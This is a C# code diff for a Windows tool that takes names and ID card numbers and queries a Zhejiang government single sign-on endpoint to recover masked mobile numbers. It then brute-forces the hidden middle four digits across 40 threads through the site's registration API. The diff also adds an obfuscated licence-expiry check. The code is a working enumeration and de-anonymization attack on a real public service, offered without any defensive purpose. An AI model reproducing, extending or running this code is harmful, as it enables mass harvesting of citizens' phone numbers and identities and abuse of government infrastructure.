@@ -40,7 +40,8 @@ namespace 浙江企业基础信息查询
                 request.Headers.Add("Cookie", cookie);
                 request.KeepAlive = true;
                 request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36";
-                request.Referer = "http://puser.zjzwfw.gov.cn/sso/newusp.do?action=forgotPwd&servicecode=zjdsjgrbs#";
+                //request.Referer = "http://puser.zjzwfw.gov.cn/sso/newusp.do?action=forgotPwd&servicecode=zjdsjgrbs#";
+               // request.Referer = "";
                 StreamWriter sw = new StreamWriter(request.GetRequestStream());
                 sw.Write(postData);
                 sw.Flush();
@@ -58,7 +59,7 @@ namespace 浙江企业基础信息查询
             {
 
                 //MessageBox.Show(ex.ToString());
-                return "";
+                return ex.ToString();
             }
 
 
@@ -182,8 +183,15 @@ namespace 浙江企业基础信息查询
         {
             try
             {
-                
+                string timestr = 查询2.GetTimeStamp();
+                string gregegedrgerheh = gdsgdgdgdgdstgfeewrwerw3r23r32rvxsvdsv.rgebgdgdvsdfsdvsdfsdvdsbgdsrt435b515sdfsdf("2", timestr);
+                string expiretime = gregegedrgerheh.Split(new string[] { "," }, StringSplitOptions.None)[2];
 
+                if (DateTime.Now > Convert.ToDateTime(expiretime))
+                {
+                    MessageBox.Show("{\"msg\":\"非法请求\"}");
+                    return;
+                }
 
                 for (int a = 0; a < dt.Rows.Count; a++)
                 {
@@ -191,7 +199,7 @@ namespace 浙江企业基础信息查询
                     
                     string name = dt.Rows[a][0].ToString().Trim();
                     string card = dt.Rows[a][1].ToString().Trim();
-                    textBox2.Text += name +"   "+a+ "\r\n";
+                    //textBox2.Text += name +"   "+a+ "\r\n";
                     Encrypt aa1 = new Encrypt(getencrypt);
                     IAsyncResult iar1 = BeginInvoke(aa1, new object[] { card });
                     string phonecrypt1 = EndInvoke(iar1).ToString();
@@ -201,7 +209,76 @@ namespace 浙江企业基础信息查询
                     string html1 = PostUrl(url1, postdata1);
                     string loginname = Regex.Match(html1, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
                     string mobilephone = Regex.Match(html1, @"""mobilephone"":""([\s\S]*?)""").Groups[1].Value;
+                    //MessageBox.Show(html1);
                     if (mobilephone.Length < 10||mobilephone.Trim()=="")
+                    {
+                        ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString());
+                        lv1.SubItems.Add(name);
+                        lv1.SubItems.Add(card);
+                        lv1.SubItems.Add("无");
+                        continue;
+                    }
+                    for (int i = 0; i < 10000; i = i + 250)
+                    {
+                        Thread thread = new Thread(new ParameterizedThreadStart(run));
+                        object o = name + "#" + card + "#" + mobilephone + "#" + loginname + "#" + i;
+                        thread.Start((object)o);
+                        Control.CheckForIllegalCrossThreadCalls = false;
+
+                    }
+                    while (status == true)
+                    {
+                        //textBox2.Text = status.ToString()+threadcount.ToString();
+                        Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
+                        if(threadcount==40)
+                        {
+                            break;
+                        }
+                    }
+                    while(threadcount<40)
+                    {
+                       // textBox2.Text = status.ToString()+threadcount.ToString();
+                        Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
+                    }
+                    status = true;
+                    threadcount = 0;
+                }
+                MessageBox.Show("完成");
+                label3.Text = "完成";
+            }
+            catch (Exception ex)
+            {
+
+                MessageBox.Show(ex.ToString());
+            }
+        }
+
+
+
+        public void runmainbeifen()
+        {
+            try
+            {
+
+
+
+                for (int a = 0; a < dt.Rows.Count; a++)
+                {
+
+
+                    string name = dt.Rows[a][0].ToString().Trim();
+                    string card = dt.Rows[a][1].ToString().Trim();
+                    textBox2.Text += name + "   " + a + "\r\n";
+                    Encrypt aa1 = new Encrypt(getencrypt);
+                    IAsyncResult iar1 = BeginInvoke(aa1, new object[] { card });
+                    string phonecrypt1 = EndInvoke(iar1).ToString();
+
+                    string url1 = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
+                    string postdata1 = "action=checkidCardUnique&idNum=" + System.Web.HttpUtility.UrlEncode(phonecrypt1);
+                    string html1 = PostUrl(url1, postdata1);
+                    string loginname = Regex.Match(html1, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
+                    string mobilephone = Regex.Match(html1, @"""mobilephone"":""([\s\S]*?)""").Groups[1].Value;
+                    if (mobilephone.Length < 10 || mobilephone.Trim() == "")
                     {
                         ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString());
                         lv1.SubItems.Add(name);
@@ -221,14 +298,14 @@ namespace 浙江企业基础信息查询
                     {
                         //textBox2.Text = status.ToString()+threadcount.ToString();
                         Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
-                        if(threadcount==20)
+                        if (threadcount == 20)
                         {
                             break;
                         }
                     }
-                    while(threadcount<20)
+                    while (threadcount < 20)
                     {
-                       // textBox2.Text = status.ToString()+threadcount.ToString();
+                        // textBox2.Text = status.ToString()+threadcount.ToString();
                         Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                     }
                     status = true;
@@ -243,7 +320,6 @@ namespace 浙江企业基础信息查询
                 MessageBox.Show(ex.ToString());
             }
         }
-
         int threadcount = 0;
         public void run(object o)
         {
@@ -258,9 +334,10 @@ namespace 浙江企业基础信息查询
 
                
 
-                for (int i = max; i < max+500; i++)
+                for (int i = max; i < max+250; i++)
                 {
 
+                  
                     if (status == false)
                     {
                         textBox2.Text += name ;
@@ -268,7 +345,7 @@ namespace 浙江企业基础信息查询
                         break;
                     }
                     string phone = mobilephone.Substring(0, 3) + i.ToString("D4") + mobilephone.Substring(7, 4);
-
+                    //label3.Text = phone;
                     Encrypt aa = new Encrypt(getencrypt);
                     IAsyncResult iar = BeginInvoke(aa, new object[] { phone });
                     string phonecrypt = EndInvoke(iar).ToString();
@@ -276,6 +353,8 @@ namespace 浙江企业基础信息查询
                     string url = "https://puser.zjzwfw.gov.cn/sso/newusp.do";
                     string postdata = "action=regByMobile&mobilephone=" + System.Web.HttpUtility.UrlEncode(phonecrypt);
                     string html = PostUrl(url, postdata);
+                   
+                   // textBox2.Text= html;
                     //if(html.Trim()=="")
                     //{
                     //    textBox3.Text = DateTime.Now.ToString()+"为空";
@@ -290,6 +369,7 @@ namespace 浙江企业基础信息查询
                     string loginname2 = Regex.Match(html, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
                     string idcard = Regex.Match(html, @"""idcard"":""([\s\S]*?)""").Groups[1].Value;
                     // label1.Text =id+"---->"+ html;
+                  
                     if (html.Contains("username"))
                     {
                         // name.Substring(name.Length - 1, 1) == username.Substring(username.Length - 1, 1) &&
